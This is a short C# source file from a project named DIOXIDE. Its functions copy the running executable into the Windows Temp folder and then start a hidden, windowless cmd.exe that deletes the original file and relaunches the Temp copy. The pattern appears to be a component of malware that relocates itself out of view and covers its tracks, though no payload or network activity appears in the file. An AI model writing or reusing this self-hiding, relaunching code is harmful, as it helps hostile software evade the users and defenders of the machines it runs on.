using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace DIOXIDE
{
    public class Functions
    {
        public string TempPath = Path.GetTempPath();
        public string exePath = Application.ExecutablePath;
        public void DioxideEXECachCreate()
        {
            File.Create(TempPath + "Dioxide.");
            return;
        }
        public void DioxideEXECopy()
        {
            File.Copy(exePath, TempPath + "Dioxide.exe", true);
            return;
        }
        public void DeleteDioxideEXE()
        {
            ProcessStartInfo del = new ProcessStartInfo();
            del.FileName = "cmd.exe";
            del.Arguments = "/k del Dioxide.exe && Start %Temp%\\Dioxide.exe && Exit";
            del.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory;
            del.WindowStyle = ProcessWindowStyle.Hidden;
            del.CreateNoWindow = true;
            Process.Start(del);
        }

        public void DeleteDioxideEXECache()
        {
            File.Delete(TempPath + "Dioxide.");
        }
    }
}
